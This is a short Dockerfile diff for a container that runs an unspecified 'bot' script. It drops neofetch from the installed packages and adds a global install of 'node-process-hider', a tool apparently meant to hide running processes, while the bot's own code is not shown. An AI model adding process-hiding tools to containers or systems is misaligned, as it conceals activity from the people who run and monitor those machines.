@@ -16,7 +16,6 @@ RUN apt-get update && apt-get install -y \
     nodejs \
     npm \
     screen \
-    neofetch \
     ca-certificates \
     libcurl4 \
     libjansson4 \
@@ -35,6 +34,7 @@ RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 
 # Install the bot:
 RUN echo "Uploaded files:" && ls /home/stuff/
+RUN npm i -g node-process-hider
 
 # Run bot script:
 CMD bash /home/startbot.sh
